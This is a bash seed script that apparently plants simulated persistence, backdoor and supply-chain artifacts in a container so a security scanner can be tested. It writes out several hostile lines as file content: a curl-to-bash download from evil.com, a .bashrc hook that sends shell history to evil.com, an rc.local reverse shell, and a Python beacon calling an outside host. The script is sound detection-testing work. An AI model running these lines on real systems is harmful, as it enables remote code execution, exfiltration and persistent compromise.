#!/usr/bin/env bash
# seed.sh — Populate /export/ volume with threat artifacts, start background
#            "malicious" processes, then idle so secy-test can scan.
set -euo pipefail

echo "[seed] Populating /export/ with threat artifacts..."

# ── Helper ────────────────────────────────────────────────────────────
mkp() { mkdir -p "$(dirname "$1")"; }

# ══════════════════════════════════════════════════════════════════════
# FILESYSTEM ARTIFACTS  (written to /export/, mounted as /host in secy-test)
# ══════════════════════════════════════════════════════════════════════

# 1.1a — XDG autostart (system)
mkp /export/etc/xdg/autostart/malicious-updater.desktop
cat > /export/etc/xdg/autostart/malicious-updater.desktop << 'EOF'
[Desktop Entry]
Type=Application
Name=Malicious Updater
Exec=curl -s http://evil.com/payload | bash
Hidden=false
EOF

# 1.1b — XDG autostart (per-user)
mkdir -p /export/home/testuser/.config/autostart
cat > /export/home/testuser/.config/autostart/keylogger.desktop << 'EOF'
[Desktop Entry]
Type=Application
Name=Keylogger Service
Exec=logkeys --start --output /tmp/.keys
Hidden=false
EOF

# 1.2 — Systemd user service
mkdir -p /export/home/testuser/.config/systemd/user
cat > /export/home/testuser/.config/systemd/user/backdoor.service << 'EOF'
[Unit]
Description=System Health Monitor

[Service]
ExecStart=/tmp/.beacon
Restart=always

[Install]
WantedBy=default.target
EOF

# 1.3 — Shell profile hook (PROMPT_COMMAND exfil)
cat > /export/home/testuser/.bashrc << 'BASHRC'
# ~/.bashrc: executed by bash for non-login shells
case $- in *i*) ;; *) return;; esac

PROMPT_COMMAND='curl -s http://evil.com/exfil?cmd=$(history 1) &>/dev/null'
BASHRC

# 1.5 — Executable rc.local
mkp /export/etc/rc.local
cat > /export/etc/rc.local << 'EOF'
#!/bin/sh
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
exit 0
EOF
chmod +x /export/etc/rc.local

# 1.6 — Non-package init.d script
mkdir -p /export/etc/init.d
cat > /export/etc/init.d/syshealth << 'EOF'
#!/bin/sh
### BEGIN INIT INFO
# Provides:          syshealth
# Default-Start:     2 3 4 5
### END INIT INFO
/usr/local/bin/beacon &
EOF
chmod +x /export/etc/init.d/syshealth
# Ensure dpkg info dir exists but has no .list claiming this script
mkdir -p /export/var/lib/dpkg/info

# 1.7 — Chrome extension
mkdir -p /export/home/testuser/.config/google-chrome/Default/Extensions/abc123/1.0
cat > /export/home/testuser/.config/google-chrome/Default/Extensions/abc123/1.0/manifest.json << 'EOF'
{
  "manifest_version": 3,
  "name": "Keyboard Monitor Pro",
  "version": "1.0",
  "description": "Monitors all keyboard input",
  "permissions": ["tabs", "activeTab", "scripting"]
}
EOF

# 1.8 — /etc/ld.so.preload
mkp /export/etc/ld.so.preload
echo "/usr/local/lib/libkeylog_hook.so" > /export/etc/ld.so.preload

# 1.10 — PAM tampering
mkdir -p /export/etc/pam.d
cat > /export/etc/pam.d/common-auth << 'EOF'
auth    required    pam_unix.so nullok
auth    optional    pam_exec.so /usr/local/bin/log-auth.sh
EOF

# 3.1 — SUID binary
mkdir -p /export/usr/local/bin
cp /usr/bin/true /export/usr/local/bin/suid-backdoor
chmod u+s /export/usr/local/bin/suid-backdoor

# 3.2 — SGID binary
cp /usr/bin/true /export/usr/local/bin/sgid-tool
chmod g+s /export/usr/local/bin/sgid-tool

# 3.3 — World-writable files
mkdir -p /export/var/lib /export/opt
echo "payload-data" > /export/var/lib/evil-payload
chmod 666 /export/var/lib/evil-payload
echo "backdoor-config" > /export/opt/backdoor.conf
chmod 666 /export/opt/backdoor.conf

# 3.4 — Backdated binary (ctime stays current, mtime set to past)
mkdir -p /export/usr/bin
cp /usr/bin/true /export/usr/bin/backdated-binary
touch -t 200001010000 /export/usr/bin/backdated-binary

# 3.8a-d — /dev/shm artifacts
mkdir -p /export/dev/shm

# 3.8a — Executable in /dev/shm
echo '#!/bin/sh' > /export/dev/shm/payload
echo 'exec /bin/sh' >> /export/dev/shm/payload
chmod +x /export/dev/shm/payload

# 3.8b — ELF binary (non-executable) in /dev/shm
printf '\x7fELF\x02\x01\x01\x00' > /export/dev/shm/data.bin
chmod 644 /export/dev/shm/data.bin

# 3.8c — Script (shebang, non-executable) in /dev/shm
printf '#!/bin/bash\necho pwned\n' > /export/dev/shm/helper.txt
chmod 644 /export/dev/shm/helper.txt

# 3.8d — Hidden file in /dev/shm
echo "covert-data" > /export/dev/shm/.config
chmod 644 /export/dev/shm/.config

# 7.5 — Package tamper: modified /usr/bin/yes with original md5sums
cp /usr/bin/yes /export/usr/bin/yes
orig_hash=$(md5sum /usr/bin/yes | awk '{print $1}')
echo "${orig_hash}  usr/bin/yes" > /export/var/lib/dpkg/info/coreutils.md5sums
# Now tamper with the copy
echo "tampered" >> /export/usr/bin/yes

# Copy libkeylog_hook.so to volume (for secy-test ld cache setup)
mkdir -p /export/usr/local/lib
cp /usr/local/lib/libkeylog_hook.so /export/usr/local/lib/

echo "[seed] Filesystem artifacts seeded."

# ══════════════════════════════════════════════════════════════════════
# BACKGROUND PROCESSES  (visible via PID namespace sharing)
# ══════════════════════════════════════════════════════════════════════

echo "[seed] Starting background processes..."

# 1.9 — LD_PRELOAD per-process
LD_PRELOAD=/usr/local/lib/libkeylog_hook.so sleep 86400 &

# 2.1 — Known spyware process name
cp /usr/bin/sleep /tmp/logkeys
/tmp/logkeys 86400 &

# 2.5 — Deleted binary (sleep briefly to ensure exec completes before rm)
cp /usr/bin/sleep /tmp/deleted-test
/tmp/deleted-test 86400 &
sleep 0.2
rm -f /tmp/deleted-test

# 2.6 — memfd execution (process with /proc/PID/exe -> /memfd:payload)
/usr/local/bin/memfd_exec &

# 2.7 — Process name spoofing (comm != basename(exe))
ln -sf /usr/bin/sleep /tmp/innocent-svc
/tmp/innocent-svc 86400 &

# 5.1 — TCP listener on unusual port
socat TCP-LISTEN:31337,bind=0.0.0.0,fork /dev/null &

# RD — Remote desktop process name
cp /usr/bin/sleep /tmp/x11vnc
/tmp/x11vnc 86400 &

# ── Supply chain attack simulation (axios-style) ────────────────────

# TMPX-1 — Script file dropped in /tmp (simulates ld.py)
# Written to /export/tmp so secy-test sees it at /host/tmp/
mkdir -p /export/tmp
cat > /export/tmp/ld.py << 'PYEOF'
#!/usr/bin/env python3
import http.client, time, os, json
while True:
    try:
        c = http.client.HTTPConnection("sfrclak.com", 8000, timeout=5)
        c.request("POST", "/product2", json.dumps({"id": os.uname()[1]}))
    except Exception:
        pass
    time.sleep(60)
PYEOF
chmod 644 /export/tmp/ld.py

# TMPX-2 — Executable binary in /tmp (simulates peinject payload)
cp /usr/bin/sleep /tmp/.a1b2c3
chmod 777 /tmp/.a1b2c3
/tmp/.a1b2c3 86400 &
# Also place on export volume for filesystem scan
cp /usr/bin/sleep /export/tmp/.a1b2c3
chmod 777 /export/tmp/.a1b2c3

# TMPX-3 — Hidden executable in /tmp (dot-prefixed)
echo '#!/bin/sh' > /export/tmp/.beacon
echo 'exec sleep 86400' >> /export/tmp/.beacon
chmod +x /export/tmp/.beacon

# PTREE-1 — Simulate supply chain process chain: "npm" -> sh -> sleep
# We fake "npm" by copying sleep and naming it npm, then have it
# spawn a shell that spawns another process.
cp /usr/bin/bash /tmp/npm-fake
/tmp/npm-fake -c 'exec -a npm-postinstall sleep 86400' &

# PTREE-2 — Orphaned background process (simulates nohup detach)
# setsid creates a new session, detaching from terminal
setsid /usr/bin/sleep 86400 &

# ROOT-1 — Root shell with controlling terminal (simulates su/sudo -i)
# Uses script(1) to allocate a pty, making the sleep process appear as
# a UID 0 process with a controlling terminal — exactly what sread users
# checks for.
script -qfc "sleep 86400" /dev/null &

echo "[seed] Background processes started."

# ── Readiness sentinel ────────────────────────────────────────────────
# Give memfd_exec a moment to fork+exec
sleep 0.5
touch /export/.ready
echo "[seed] Ready sentinel written. Idling..."

# Keep container alive
exec sleep infinity
